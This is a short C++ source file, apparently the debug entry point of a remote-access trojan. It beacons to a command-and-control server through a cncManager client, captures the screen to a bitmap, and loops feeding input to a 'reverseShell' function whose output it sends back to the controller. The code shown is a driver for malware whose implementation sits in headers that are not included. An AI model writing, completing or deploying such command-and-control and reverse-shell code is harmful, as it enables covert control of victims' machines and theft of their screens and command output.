#include "cncManager.h"
#include "commandManager.h"
#include <stdlib.h>
#include <iostream>
#include <string>

/* For DEBUG */
int main() {
    commandManager cmd;
    cncManager client;
    client.sendBeacon();

    cmd.getScreen("abcd.bmp");
    while (TRUE) {
        std::string str;
        std::cout << "Insert key : ";
        std::getline(std::cin, str);
        str = cmd.reverseShell(str.c_str());
        std::cout << str << std::endl;
        client.sendData(shellResponse, str.size(), (LPVOID)str.c_str());
    }
}